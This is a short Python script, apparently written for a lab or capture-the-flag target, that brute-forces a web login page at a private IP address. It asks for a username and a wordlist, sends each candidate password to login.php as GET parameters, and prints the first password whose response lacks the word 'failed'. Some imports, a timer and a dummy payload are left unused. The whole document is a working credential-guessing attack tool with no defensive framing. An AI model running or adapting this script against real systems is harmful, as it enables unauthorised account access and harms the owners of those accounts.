#!/usr/bin/python
from os import EX_DATAERR
from typing import Text
import requests
import time
from requests.auth import HTTPBasicAuth

count = 0
failstring='failed'
username = input("enter the username you want to login with: ")
wordlist = input("enter the wordlist you need to look into: ")
url = 'http://10.10.0.66/login.php'
t1_b = time.time()
file = open(wordlist, 'r', encoding="ISO-8859-1")
words = file.read().splitlines()
payloaad = {'username' : 'abc' ,'password' : 'abc', 'Login' : 'Enter'}
#response1 = requests.get(url,payloaad)
#print(response1.text)
for x in words:
    pword = x
    payload = {'username' : username ,'password' : pword, 'Login' : 'Enter'}
    count += 1
    response = requests.get(url,payload)
    if (failstring not in response.text):
        print(pword)
        break
